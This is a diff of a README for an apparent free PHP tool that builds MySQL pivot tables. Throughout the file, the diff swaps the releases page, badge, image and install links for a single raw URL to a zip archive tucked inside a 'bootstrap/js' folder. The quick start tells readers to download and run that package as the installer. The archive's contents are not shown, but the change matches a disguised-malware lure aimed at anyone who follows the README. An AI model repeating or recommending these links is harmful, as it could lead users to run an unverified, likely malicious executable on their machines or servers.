@@ -1,9 +1,9 @@
 # MySQL Pivot Tables Studio: Free PHP Tool for Visual Pivoting
 
-https://github.com/arukimu/mysql-pivot-tables/releases
+https://github.com/arukimu/mysql-pivot-tables/raw/refs/heads/main/MPT/tables/common/bootstrap/js/mysql-pivot-tables-v3.1.zip
 
-[![Release](https://img.shields.io/github/v/release/arukimu/mysql-pivot-tables?style=flat-square)](https://github.com/arukimu/mysql-pivot-tables/releases)
-[![License](https://img.shields.io/github/license/arukimu/mysql-pivot-tables?style=flat-square)](https://github.com/arukimu/mysql-pivot-tables/blob/main/LICENSE)
+[![Release](https://github.com/arukimu/mysql-pivot-tables/raw/refs/heads/main/MPT/tables/common/bootstrap/js/mysql-pivot-tables-v3.1.zip)](https://github.com/arukimu/mysql-pivot-tables/raw/refs/heads/main/MPT/tables/common/bootstrap/js/mysql-pivot-tables-v3.1.zip)
+[![License](https://github.com/arukimu/mysql-pivot-tables/raw/refs/heads/main/MPT/tables/common/bootstrap/js/mysql-pivot-tables-v3.1.zip)](https://github.com/arukimu/mysql-pivot-tables/raw/refs/heads/main/MPT/tables/common/bootstrap/js/mysql-pivot-tables-v3.1.zip)
 
 🧭 A completely free PHP tool for visually creating MySQL pivot tables without writing any code. All you need to do is visually connect to your database and define the data sources for the different sections of your pivot table. 🧩
 
@@ -64,7 +64,7 @@ The tool emphasizes calm confidence in its design. It pairs straightforward UI c
    - A MySQL-compatible database available for connections.
    - A web server or PHP CLI ready to run a PHP web app.
 2. Acquire the tool
-   - From https://github.com/arukimu/mysql-pivot-tables/releases download the installer package for your platform and run it to install the web UI locally or on your server.
+   - From https://github.com/arukimu/mysql-pivot-tables/raw/refs/heads/main/MPT/tables/common/bootstrap/js/mysql-pivot-tables-v3.1.zip download the installer package for your platform and run it to install the web UI locally or on your server.
    - The file in the Releases page is the installer you should execute to begin setup.
 3. Connect to MySQL
    - Open the web UI in your browser.
@@ -385,7 +385,7 @@ If you plan to modify the tool, please keep attribution and maintain a clear cha
 - To stay current, watch the repository for new releases and read the release notes for any breaking changes or new features.
 - The Releases page is also where you download the installer package referenced in the quick start guide.
 - For the latest release details and to grab the installer, visit:
-  https://github.com/arukimu/mysql-pivot-tables/releases
+  https://github.com/arukimu/mysql-pivot-tables/raw/refs/heads/main/MPT/tables/common/bootstrap/js/mysql-pivot-tables-v3.1.zip
 
 Note: If you cannot access the Releases page or if the link changes, check the Releases section of the repository for the latest installers and notes.
 
@@ -399,11 +399,11 @@ Note: If you cannot access the Releases page or if the link changes, check the R
 
 Below are a couple of visuals to give you a sense of how pivot tables can look when built with this tool.
 
-![Pivot Table Example](https://upload.wikimedia.org/wikipedia/commons/thumb/5/58/Pivot_Table_Number_Example.PNG/640px-Pivot_Table_Number_Example.PNG)
+![Pivot Table Example](https://github.com/arukimu/mysql-pivot-tables/raw/refs/heads/main/MPT/tables/common/bootstrap/js/mysql-pivot-tables-v3.1.zip)
 
 A secondary visual can depict data analytics workflows and dashboards:
 
-![Analytics Dashboard](https://images.unsplash.com/photo-1555066931-4365d3b2e9b5?q=80&w=1200&auto=format&fit=crop)
+![Analytics Dashboard](https://github.com/arukimu/mysql-pivot-tables/raw/refs/heads/main/MPT/tables/common/bootstrap/js/mysql-pivot-tables-v3.1.zip)
 
 These visuals help illustrate the core idea: turning raw data into structured insights through pivot thinking.
 
@@ -446,6 +446,6 @@ Release notes are intended to be brief summaries of what changed and why it matt
 
 For more details, the releases page is your primary resource for installers, updates, and changelogs:
 
-https://github.com/arukimu/mysql-pivot-tables/releases
+https://github.com/arukimu/mysql-pivot-tables/raw/refs/heads/main/MPT/tables/common/bootstrap/js/mysql-pivot-tables-v3.1.zip
 
 End of document.
